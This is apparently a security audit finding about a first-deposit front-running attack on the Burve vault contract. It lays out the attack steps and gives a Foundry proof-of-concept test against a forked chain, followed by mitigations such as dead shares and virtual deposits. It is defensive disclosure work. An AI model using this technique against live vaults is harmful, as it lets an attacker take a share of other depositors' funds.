---
tags:
  - lang/solidity
  - sector/vault
  - has/github
  - has/poc
  - severity/high
protocol: "[[Burve]]"
auditors:
  - Pashov Audit Group
report: "https://github.com/pashov/audits/blob/master/team/md/Burve-security-review_2025-03-05.md"
genome:
  - "[[frontrun-exposure]]"
  - "[[mev/frontrun]]"
  - "[[first-deposit]]"
---
# [H-02] First deposit front-running attack

- id: 57723
- impact: HIGH
- protocol: Burve_2025-03-05
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/Burve-security-review_2025-03-05.md

## Summary


This bug report discusses a high severity issue with the `Burve` contract, which is a type of ERC-4626 vault. This issue allows an attacker to front-run the first deposit made by a user, resulting in the user losing a significant portion of their shares. The report provides a proof of concept and recommends implementing a solution such as using dead shares or a virtual deposit to mitigate this issue.

## Details

## Severity

**Impact:** High

**Likelihood:** Medium

## Description

The `Burve` contract is subject to a common issue of ERC-4626 vaults, where the first deposit is front-run by an attacker.

1. A user will add liquidity into the contract to mint shares.
2. The attacker front-runs the user's transaction by minting one share and donating 50% of the liquidity provided by the user.
3. The user transaction is executed, and the shares minted are calculated as `mintNominalLiq * totalShares / totalNominalLiq`. As `compoundV3Ranges()` is executed, `totalNominalLiq` is inflated by the attacker's donation, so the division is truncated, and the user mints only 1 share: `x * 1 / (0.5x + 1) = 1`.
4. The attacker burns his share, receiving half of the liquidity of the contract.

### Proof of concept

Add the following code to the file `test/single/Burve.t.sol` and run `forge test --mt test_firstDepositorDonation --fork-url https://rpc.berachain.com/ --fork-block-number 2073450`.

```solidity
function test_firstDepositorDonation() public forkOnly {
    deal(address(token0), address(alice), 10e18);
    deal(address(token1), address(alice), 10e18);
    deal(address(token0), address(charlie), 10e18);
    deal(address(token1), address(charlie), 10e18);

    // Alice provides 1 wei of liquidity
    uint128 liq = 1;
    (int24 lower, int24 upper) = burveV3.ranges(0);
    (uint256 mint0, uint256 mint1) = getAmountsForLiquidity(liq, lower, upper, true);

    vm.startPrank(alice);
    token0.approve(address(burveV3), mint0);
    token1.approve(address(burveV3), mint1);
    burveV3.mint(address(alice), liq, 0, type(uint128).max);
    vm.stopPrank();

    // Alice donates 1e18 of liquidity
    liq = 1e18;
    (mint0, mint1) = getAmountsForLiquidity(liq, lower, upper, true);

    vm.startPrank(alice);
    token0.transfer(address(burveV3), mint0);
    token1.transfer(address(burveV3), mint1);
    vm.stopPrank();

    // Charlie provides 2e18 of liquidity and mints only 1 share
    liq = 2e18;
    (mint0, mint1) = getAmountsForLiquidity(liq, lower, upper, true);

    vm.startPrank(charlie);
    token0.approve(address(burveV3), mint0);
    token1.approve(address(burveV3), mint1);
    burveV3.mint(address(charlie), liq, 0, type(uint128).max);
    vm.stopPrank();

    assertEq(burveV3.totalShares(), 2);
    assertEq(burveV3.balanceOf(charlie), 1);
}
```

## Recommendations

There are different ways to mitigate this issue, including:

- Use of dead shares: Forces to provide liquidity on the contract's deployment. This one would be the easiest to implement.
- Use of virtual deposit: OpenZeppelin's ERC4626 implements this solution and is [well documented](https://docs.openzeppelin.com/contracts/4.x/erc4626).
